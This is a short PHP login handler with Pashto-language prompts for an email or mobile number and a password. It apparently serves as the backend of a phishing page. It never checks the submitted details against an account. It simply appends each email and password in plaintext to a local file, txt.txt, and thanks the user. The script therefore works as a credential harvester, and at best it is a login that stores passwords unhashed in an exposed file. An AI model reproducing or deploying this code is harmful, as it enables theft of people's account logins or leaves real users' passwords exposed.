<?php
$message = "";
$mess = "";

if(isset($_POST['login'])) {
if(!empty($_POST)) {
	if (!empty($_POST['email'])){
		if(!empty($_POST['pass'])) {
			$email  = $_POST['email'];
			$pass   = $_POST['pass'];
			//-----------------------
			if(is_file("txt.txt")) {
					$file =  fopen("txt.txt","a");
					$PE =  $email."---------".$pass."\r\n";

					fwrite($file,$PE);
					fclose($file);
					$mess  = "<div style='background:tomato;text-align:center;border-radius:10px'>سیالی مخکی له مخکی پای ته ورسیدل تشکر</div>";
			}

		}else {
			$message = "<div class='text-danger'>فاسورډ داخل کړی !</div>";
		}
	}else {
		$message = "<div class='text-danger'>ایمیل یا موبائل داخل کړی !</div>";
	}
}else {
	$message = "<div class='text-danger'>ایمیل / موبائل نمبر  او قاسورډ داخل کړی !</div>";
}

}



